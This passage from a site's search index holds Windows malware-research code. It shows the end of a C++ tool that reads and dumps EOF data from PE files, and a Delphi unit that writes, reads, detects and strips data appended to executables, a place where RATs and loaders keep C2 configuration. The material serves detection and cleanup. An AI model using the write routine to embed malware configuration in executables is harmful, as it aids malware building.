(!ReadFile(hFile, \u0026amp;AImageFileHeader, sizeof(IMAGE_FILE_HEADER), \u0026amp;dwBytesRead, nullptr)) { cout \u0026lt;\u0026lt; \u0026quot;Could not read IMAGE_FILE_HEADER.\u0026quot; \u0026lt;\u0026lt; endl; CloseHandle(hFile); return 0; } // Checking if we are facing a x64 or x86 PE File. bool x64 = (AImageFileHeader.Machine == IMAGE_FILE_MACHINE_AMD64); log_debug(string(\u0026quot;Facing \u0026quot;) + (x64 ? \u0026quot;64\u0026quot; : \u0026quot;32\u0026quot;) + string(\u0026quot;bit PE File.\u0026quot;)); __int64 AImageSize = 0; /* Reading IMAGE_OPTIONAL_HEADER. Support both x64 and x64. */ if (x64) { IMAGE_OPTIONAL_HEADER64 AOptionalHeader; if (!ReadFile(hFile, \u0026amp;AOptionalHeader, sizeof(IMAGE_OPTIONAL_HEADER64), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_OPTIONAL_HEADER64\u0026quot;); CloseHandle(hFile); return 0; } /* We don't forget to add the IMAGE_DIRERCTORY_ENTRY_SECURITY if target application is signed otherwise the full image size wont match. */ AImageSize += (__int64(AOptionalHeader.SizeOfHeaders) + __int64(AOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size)); } else { IMAGE_OPTIONAL_HEADER32 AOptionalHeader; if (!ReadFile(hFile, \u0026amp;AOptionalHeader, sizeof(IMAGE_OPTIONAL_HEADER32), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_OPTIONAL_HEADER32\u0026quot;); CloseHandle(hFile); return 0; } // Same as above AImageSize += (__int64(AOptionalHeader.SizeOfHeaders) + __int64(AOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size)); } /* Enumerate each sections, and append to our current mesured image size. */ for (int i = 0; i \u0026lt; AImageFileHeader.NumberOfSections; i++) { IMAGE_SECTION_HEADER AImageSectionHeader; if (!ReadFile(hFile, \u0026amp;AImageSectionHeader, sizeof(IMAGE_SECTION_HEADER), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Fail to read section n°\u0026quot; + to_string(i)); CloseHandle(hFile); return 0; // If one section fail to be read, then we loose. } AImageSize += AImageSectionHeader.SizeOfRawData; } log_success(\u0026quot;Image Size successfully calculated : \u0026quot; + to_string(AImageSize) + \u0026quot; bytes\u0026quot;); /* Checking if some EOF data is present in target file. */ unsigned AEOFSize = (AFileSize - AImageSize); if (AEOFSize \u0026gt; 0) { log_warn(to_string(AEOFSize) + \u0026quot; bytes of EOF Data detected.\u0026quot;); /* Read EOF Data */ log_debug(\u0026quot;Extracting / Printing EOF Data:\u0026quot;); cout \u0026lt;\u0026lt; endl; SetFilePointer(hFile, (AFileSize - AEOFSize), nullptr, FILE_BEGIN); // Could also use FILE_END PVOID pBuffer = malloc(AEOFSize); if (!ReadFile(hFile, pBuffer, AEOFSize, \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read EOF data.\u0026quot;); } else { /* Print EOF data. */ HexDumpBufferToConsole(pBuffer, AEOFSize);\t} /* Offering user to dump EOF Data to file */ cout \u0026lt;\u0026lt; \u0026quot;Do you want to dump the content of EOF Data ? (y/n) : \u0026quot;; string s = \u0026quot;\u0026quot;; cin.width(1); // we only take care of first character. cin \u0026gt;\u0026gt; s; if (s == \u0026quot;y\u0026quot;) { cout \u0026lt;\u0026lt; \u0026quot;Output file path : \u0026quot;; wstring AOutputPath; cin.width(MAX_PATH); wcin \u0026gt;\u0026gt; AOutputPath; /* Write EOF data to file */ DWORD AErrorCode = 0; if (!WriteBufferToFile(pBuffer, AEOFSize, AOutputPath, \u0026amp;AErrorCode)) { log_error(\u0026quot;Could no write EOF data to file with error \u0026quot; + to_string(AErrorCode)); } else { log_success(\u0026quot;EOF data successfully dumped.\u0026quot;); }; } free(pBuffer); } else { log_success(\u0026quot;No EOF data detected so far.\u0026quot;); } CloseHandle(hFile); return 0; } "});index.add({'id':31,'href':'/docs/windows/snippets/delphi/eof/','title':"Manipulation and Detection of EOF",'content':"Description This Delphi unit demonstrate how to manipulate EOF Data of a Valid Microsoft Windows Portable Executable (PE) File.\nEOF (End Of File) is often used by Malware authors to offer their Malware users a way to edit Malware payload configuration (Ex: C2 informations) without having access to source code.\nYou often encounter such techniques in:\n Remote Access Tool/Trojan (RAT) File Wrapper / Binder Downloader Loader / Botnets  But not only.\nSupported Features (32bit and 64bit)  Write EOF Data to Valid PE File. Read EOF Data from Valid PE File. Clear EOF Data if Present in Valid PE File . Retrieve EOF Data Size if Present in Valid PE File. Detect EOF Data presence in Valid PE File.  Resources  https://gist.github.com/DarkCoderSc/33314f50f5199cf49dbdf7a29a7f4a69  C/C++ Implementation (Read / Extract) https://github.com/DarkCoderSc/eof-reader\nCode (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ Description: -\u0026gt; Unit for EOF manipulation on Portable Executable Files (x86/x64). -\u0026gt; Detection and Removal of EOF Data (Often used by Malware to store configuration / files etc..). Category: -\u0026gt; Malware Research \u0026amp; Detection License: -\u0026gt; MIT Functions: -\u0026gt; WritePEOF() : Write extra data at the end of a PE File. -\u0026gt; ReadPEOF() : Read extra data stored at the end of a PE File. -\u0026gt; FileIsValidPE() : Check whether or not a file is a valid Portable Executable File. -\u0026gt; ClearPEOF() : Remove / Sanitize / Disinfect a PE File from any extra data stored at it end. -\u0026gt; GetPEOFSize() : Get the size of the extra data stored at the end of a PE File. -\u0026gt; GetFileSize() : Get the expected file size of a PE File following PE Header description. -\u0026gt; ContainPEOF() : Return True if some extra data is detected at the end of a PE File. *******************************************************************************) unit UntEOF; interface uses WinAPI.Windows, System.SysUtils, Classes; type TBasicPEInfo = record Valid : Boolean; // True = Valid PE; False = Invalid PE Arch64 : Boolean; // True = 64bit Image; False = 32bit Image ImageSize : Int64; end; function WritePEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer) : Boolean; function ReadPEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer; ABufferPos : Integer = 0) : Boolean; function FileIsValidPE(AFileName : String) : Boolean; function ClearPEOF(APEFile : String) : Boolean; function GetPEOFSize(APEFile : String) : Int64; function GetFileSize(AFileName : String) : Int64; function ContainPEOF(APEFile : String) : Boolean; implementation {------------------------------------------------------------------------------- Get File Size (Nothing more to say) -------------------------------------------------------------------------------} function GetFileSize(AFileName : String) : Int64; var AFileInfo : TWin32FileAttributeData; begin result := 0; if NOT FileExists(AFileName) then Exit(); if NOT GetFileAttributesEx( PWideChar(AFileName), GetFileExInfoStandard, @AFileInfo) then Exit(); /// result := (Int64(AFileInfo.nFileSizeLow) or Int64(AFileInfo.nFileSizeHigh shl 32)); end; {------------------------------------------------------------------------------- Is target file a 64bit PE file -------------------------------------------------------------------------------} function GetBasicPEInfo(APEFile : String; var ABasicPEInfo : TBasicPEInfo) : Boolean; var hFile : THandle; AImageDosHeader : TImageDosHeader; dwBytesRead : DWORD; AImageFileHeader : TImageFileHeader; AImageNtHeaderSignature : DWORD; AOptionalHeader32 : TImageOptionalHeader32; AOptionalHeader64 : TimageOptionalHeader64; I : Integer; AImageSectionHeader : TimageSectionHeader; begin result := False; ABasicPEInfo.Valid := False; ABasicPEInfo.Arch64 := False; ABasicPEInfo.ImageSize := 0; // Open Target File (Must Exists) hFile := CreateFile( PChar(APEFile), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit; try SetFilePointer(hFile, 0, nil, FILE_BEGIN); // Read the Image Dos Header if NOT ReadFile( hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, nil ) then Exit(); // To be considered as a valid PE file, e_magic must be $5A4D (MZ) if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit(); // Move the cursor to Image NT Signature SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); // Read the Image NT Signature if NOT ReadFile( hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, nil ) then Exit(); // To be considered as a valid PE file, Image NT Signature must be $00004550 (PE00) if (AImageNtHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit(); ABasicPEInfo.Valid := True; // Read the Image File Header if NOT ReadFile( hFile, AImageFileHeader, sizeOf(TImageFileHeader), dwBytesRead, 0 ) then Exit(); // TImageDosHeader.Machine contains the architecture of the file ABasicPEInfo.Arch64 := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if ABasicPEInfo.Arch64 then begin // For 64bit Image if NOT ReadFile( hFile, AOptionalHeader64, sizeOf(TImageOptionalHeader64), dwBytesRead, 0 ) then Exit(); Inc(ABasicPEInfo.ImageSize, AOptionalHeader64.SizeOfHeaders); Inc(ABasicPEInfo.ImageSize, AOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size); end else begin // For 32bit Image if NOT ReadFile( hFile, AOptionalHeader32, sizeOf(TImageOptionalHeader32), dwBytesRead, 0 ) then Exit(); Inc(ABasicPEInfo.ImageSize, AOptionalHeader32.SizeOfHeaders); Inc(ABasicPEInfo.ImageSize, AOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size); end; // Iterate through each section to get the size of each for ImageSize calculation for I := 0 to AImageFileHeader.NumberOfSections -1 do begin if NOT ReadFile( hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0 ) then Exit(); // Fatal Inc(ABasicPEInfo.ImageSize, AImageSectionHeader.SizeOfRawData); end; // All steps successfully passed result := True; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Is target file a valid Portable Executable -------------------------------------------------------------------------------} function FileIsValidPE(AFileName : String) : Boolean; var ABasicPEInfo : TBasicPEInfo; begin result := False; /// GetBasicPEInfo(AFileName, ABasicPEInfo); result := ABasicPEInfo.Valid; end; {------------------------------------------------------------------------------- Write Data to the End of a PE File. -------------------------------------------------------------------------------} function WritePEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer) : Boolean; var hFile : THandle; ABytesWritten : Cardinal; begin result := false; if NOT FileIsValidPE(APEFile) then Exit(); hFile := CreateFile( PWideChar(APEFile), GENERIC_WRITE, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit; try SetFilePointer(hFile, 0, nil, FILE_END); if NOT WriteFile( hFile, ABuffer^, ABufferSize, ABytesWritten, 0 ) then Exit(); result := true; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Read Data from the End of a PE File. -------------------------------------------------------------------------------} function ReadPEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer; ABufferPos : Integer = 0) : Boolean; var hFile : THandle; ABytesRead : Cardinal; begin result := false; if NOT FileIsValidPE(APEFile) then Exit(); hFile := CreateFile( PWideChar(APEFile), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit(); try SetFilePointer( hFile, (-ABufferSize + ABufferPos), nil, FILE_END ); if NOT ReadFile( hFile, ABuffer^, ABufferSize, ABytesRead, 0 ) then Exit(); result := true; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Get Target PE File EOF Size return codes: ------------- -1 : Error \u0026gt;= 0 : The length of EOF data found -------------------------------------------------------------------------------} function GetPEOFSize(APEFile : String) : Int64; var ABasicPEInfo : TBasicPEInfo; begin result := -1; if NOT GetBasicPEInfo(APEFile, ABasicPEInfo) then raise Exception.Create('Error: Invalid PE File'); result := (GetFileSize(APEFile) - ABasicPEInfo.ImageSize); end; {------------------------------------------------------------------------------- Clear unexpected data at the end of a PE File -------------------------------------------------------------------------------} function ClearPEOF(APEFile : String) : Boolean; var ABasicPEInfo : TBasicPEInfo; AFileStream : TMemoryStream; AFileSize : Int64; AImageSize : Int64; begin result := False; if NOT GetBasicPEInfo(APEFile, ABasicPEInfo) then raise Exception.Create('Error: Invalid PE File'); AFileSize := GetFileSize(APEFile); AImageSize := ABasicPEInfo.ImageSize; // No EOF but no error so far so we return true if (AFileSize - AImageSize) = 0 then begin Exit(True); end; { One technique to patch the file. Ignore content after the ImageSize grabbed from PE info. } AFileStream := TMemoryStream.Create(); try AFileStream.LoadFromFile(APEFile); AFileStream.Position := 0; AFileStream.SetSize(AImageSize); AFileStream.SaveToFile(APEFile); finally AFileStream.Free; end; result := True; end; {------------------------------------------------------------------------------- Detect if a PE file contain some data at the end of the file -------------------------------------------------------------------------------} function ContainPEOF(APEFile : String) : Boolean; begin result := (GetPEOFSize(APEFile) \u0026gt; 0); end; end. "});})();